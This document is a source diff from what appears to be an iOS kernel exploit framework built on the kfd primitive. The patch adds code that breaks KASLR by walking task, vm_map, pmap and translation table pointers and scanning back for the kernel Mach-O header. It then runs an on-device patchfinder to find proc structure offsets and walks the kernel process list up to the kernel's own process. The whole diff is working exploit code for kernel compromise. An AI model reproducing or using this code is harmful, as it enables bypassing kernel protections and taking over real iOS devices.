@@ -118,54 +118,12 @@ static u64 ke_sem_unsign(u64 p)
     return p | ~((1ULL << (64 - ke_sem_t1sz())) - 1ULL);
 }
 
-// Runtime derivation of the struct proc layout (no kernelcache, no patchfinder):
-// the semaphore owner is our own task; struct proc either embeds the task at
-// +0x10 (iOS 15) or is allocated right before it in the same zone
-// (iOS 16/17: task = proc + object_size).
-static void ke_kfd_derive_proc_layout(struct kfd* kfd, u64 task_kaddr)
-{
-    const u64 selfPid = (u64)kfd->info.env.pid;
-    u64 objectSize = 0;
-    u64 pidOff = 0x60;
-    u64 taskOff = 0x0;
+// On-device patchfinder shim (implemented in ke_backend_kfd.m, which owns g_kfd).
+extern size_t keKfdPfKread(uint64_t kaddr, void *out, size_t size);
 
-    // iOS 15: task embedded at +0x10, pid at +0x68
-    for (u64 d = 0x300; d <= 0x1000 && objectSize == 0; d += 8) {
-        u64 cand = task_kaddr - d;
-        u64 v = 0;
-        kread((u64)kfd, cand + 0x10, &v, sizeof(v));
-        if (v != task_kaddr) continue;
-        u32 pid = 0xFFFFFFFF;
-        kread((u64)kfd, cand + 0x68, &pid, sizeof(pid));
-        if ((u64)pid == selfPid) {
-            objectSize = d;
-            pidOff = 0x68;
-            taskOff = 0x10;
-        }
-    }
-
-    // iOS 16/17: task follows the proc; our pid is at +0x60
-    for (u64 d = 0x300; d <= 0x1000 && objectSize == 0; d += 8) {
-        u64 cand = task_kaddr - d;
-        u32 pid = 0xFFFFFFFF;
-        kread((u64)kfd, cand + 0x60, &pid, sizeof(pid));
-        if ((u64)pid == selfPid) {
-            objectSize = d;
-            pidOff = 0x60;
-            taskOff = 0x0;
-        }
-    }
-
-    if (objectSize == 0) return;
-
-    dynamic_system_info.proc__object_size = objectSize;
-    dynamic_system_info.proc__p_pid = pidOff;
-    dynamic_system_info.proc__p_list__le_next = 0x0;
-    dynamic_system_info.proc__p_list__le_prev = 0x8;
-    dynamic_system_info.proc__p_fd__fd_ofiles = 0xf8;
-    dynamic_system_info.proc__task = taskOff;
-    dynamic_system_info.task__map = 0x28;
-}
+// Serotonin rule: derive proc__object_size at runtime with the on-device
+// patchfinder. The struct proc layout of iOS 16/17 is stable apart from the
+// proc allocation size (task = proc + object_size, pid at +0x60).
 
 void kread_sem_open_find_proc(struct kfd* kfd)
 {
@@ -174,26 +132,74 @@ void kread_sem_open_find_proc(struct kfd* kfd)
     u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
     u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
 
-    ke_kfd_derive_proc_layout(kfd, task_kaddr);
-    if (!dynamic_system_info.proc__object_size) return;
+    if (!dynamic_system_info.proc__object_size) {
+        // Step 1: break KASLR by walking task->vm_map->pmap->tte and scanning
+        // backwards for the kernel Mach-O header (Serotonin rule).
+        u64 vm_map = 0;
+        kread((u64)kfd, task_kaddr + 0x28, &vm_map, sizeof(vm_map));
+        vm_map = ke_sem_unsign(vm_map);
+        if (!vm_map || !(vm_map >> 40)) return;
 
-    // The semaphore owner is our own task, so this is our proc.
-    u64 owner_proc = task_kaddr - dynamic_system_info.proc__object_size;
-    kfd->info.kaddr.current_proc = owner_proc;
+        u64 pmap = 0;
+        kread((u64)kfd, vm_map + 0x40, &pmap, sizeof(pmap));
+        pmap = ke_sem_unsign(pmap);
+        if (!pmap || !(pmap >> 40)) return;
 
-    // Walk backwards to proc 0 (pid 0), the head of allproc; forward
-    // iteration from there (ke_proc.c) covers every process, including
-    // ones created after us.
-    u64 walk = owner_proc;
-    for (int i = 0; i < 8192; i++) {
-        i32 wpid = (i32)dynamic_kget(proc__p_pid, walk);
-        if (wpid == 0) {
-            gKeKfdKernelProc = walk;
+        u64 tte_page = 0;
+        kread((u64)kfd, pmap, &tte_page, sizeof(tte_page));
+        tte_page = ke_sem_unsign(tte_page) & ~0xfffull;
+        if (!tte_page || !(tte_page >> 40)) return;
+
+        u64 kbase = 0;
+        for (u64 i = 0; i < 0x8000; i++) {
+            u64 val = 0;
+            kread((u64)kfd, tte_page, &val, sizeof(val));
+            if (val == 0x100000cfeedfacf) {
+                u64 flags = 0;
+                kread((u64)kfd, tte_page + 0x18, &flags, sizeof(flags));
+                if (flags == 0 || flags == 0x200001) {
+                    kbase = tte_page;
+                    break;
+                }
+            }
+            tte_page -= 0x1000;
+        }
+        if (!kbase) return;
+
+        // Step 2: on-device patchfinder for proc__object_size.
+        if (init_kernel(keKfdPfKread, kbase, NULL) != 0) return;
+        u64 objectSize = find_proc_object_size();
+        term_kernel();
+        if (!objectSize || objectSize < 0x180 || objectSize > 0x1000) return;
+
+        dynamic_system_info.proc__object_size = objectSize;
+        dynamic_system_info.proc__p_pid = 0x60;
+        dynamic_system_info.proc__p_list__le_next = 0x0;
+        dynamic_system_info.proc__p_list__le_prev = 0x8;
+        dynamic_system_info.proc__p_fd__fd_ofiles = 0xf8;
+        dynamic_system_info.proc__task = 0x0;
+        dynamic_system_info.task__map = 0x28;
+    }
+
+    // Step 3: the semaphore owner task sits right after its proc; walk the
+    // proc list backwards until we find our own pid, then keep going to
+    // pid 0 (head of allproc) for the forward-walk discovery in ke_proc.c.
+    u64 proc = task_kaddr - dynamic_system_info.proc__object_size;
+    if (!(proc & 0xFFFF000000000000ULL)) return;
+    kfd->info.kaddr.current_proc = proc;
+
+    for (int i = 0; i < 16384; i++) {
+        i32 pid = (i32)dynamic_kget(proc__p_pid, proc);
+        if (pid == (i32)kfd->info.env.pid) {
+            kfd->info.kaddr.current_proc = proc;
+        }
+        if (pid == 0) {
+            gKeKfdKernelProc = proc;
             break;
         }
-        u64 prev = ke_sem_unsign(dynamic_kget(proc__p_list__le_prev, walk));
+        u64 prev = ke_sem_unsign(dynamic_kget(proc__p_list__le_prev, proc));
         if (!prev || !(prev & 0xFFFF000000000000ULL)) break;
-        walk = prev;
+        proc = prev;
     }
 }
 
